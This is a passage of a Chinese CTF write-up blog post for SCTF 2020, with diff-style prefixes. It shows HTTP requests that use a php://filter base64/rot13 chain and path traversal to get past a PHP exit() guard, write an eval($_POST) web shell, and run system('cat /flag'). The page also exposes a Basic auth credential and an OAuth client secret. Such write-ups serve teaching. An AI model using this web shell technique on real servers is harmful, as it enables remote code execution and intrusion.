+Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 155
+
+file=php://filter/read=convert.base64-encode/resource=/tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b743f45ea3d60a1190e3f723595050ca2.php&amp;1=phpinfo();&amp;1=phpinfo();</code></pre><p>写到文件里的内容</p>
+<pre><code>&lt;?php
+//000000000000
+ exit();?&gt;
+s:163:&quot;php://filter/write=convert.base64-encode/resource=../../../../../../../../../../../../../../../../tmp/filenamebfe3467e649d6d158c51b5b5494ca5a2.php&quot;;</code></pre><p>这里 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> 里面的方法已经不管用了，我们需要自己想出其他办法</p>
+<p>这里我们用<code>php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=</code>来绕过死亡exit</p>
+<pre><code class="php">    $backdoor = &#39;&lt;?php eval($_POST[1]);?&gt;&#39;;
+    $x = str_rot13(base64_encode($payload));
+    $payload = base64_decode(str_rot13(base64_encode($backdoor)));
+    assert(base64_decode($x) === $backdoor);</code></pre>
+<p><code>$dieORexit --convert.base64-encode|string.rot13|convert.base64-decode--&gt; something else</code></p>
+<p><code>$payload   --convert.base64-encode|string.rot13|convert.base64-decode--&gt; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;</code> </p>
+<p>最后的payload:<br><code>&#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/t&#39;.urldecode(&quot;%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E&quot;)</code></p>
+<pre><code>POST /public/nationalsb/login.php HTTP/1.1
+Host: 8.208.102.48
+Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 126
+
+file=%2ftmp%2ft%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E743f45ea3d60a1190e3f723595050ca2.php&amp;1=system(&#39;cat /flag&#39;);</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/07/07/sctf2020/">http://blog.ccreater.top/2020/07/07/sctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/07/07/sctf2020/" data-id="ckcblsj910000fwv08vp22raj" data-title="sctf2020" class="article-share-link">Share</a>
+      
+	  
+			  
+				  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '3fd4b7c51e3cfe6d1f43',
+        clientSecret: 'e3b1162bfd0bc86431672a764a8c801b4dc97929',
+        id: md5(window.location.pathname),
+        repo: 'Explorersss.github.io',
+        owner: 'Explorersss',
+        admin: 'Explorersss',
+        distractionFreeMode: 'true'
+    })
+    gitalk.render('gitalk-container')
+</script>
+				
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/06/30/bypass_disable_function_open_basedir/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">bypass_disable_function_open_basedir</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 10px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16.67px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/07/07/sctf2020/">sctf2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/30/bypass_disable_function_open_basedir/">bypass_disable_function_open_basedir</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/30/tctf2020/">tctf2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/">拟态防御记录</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/">2020第三届BJDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 ccreater<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
+</html>
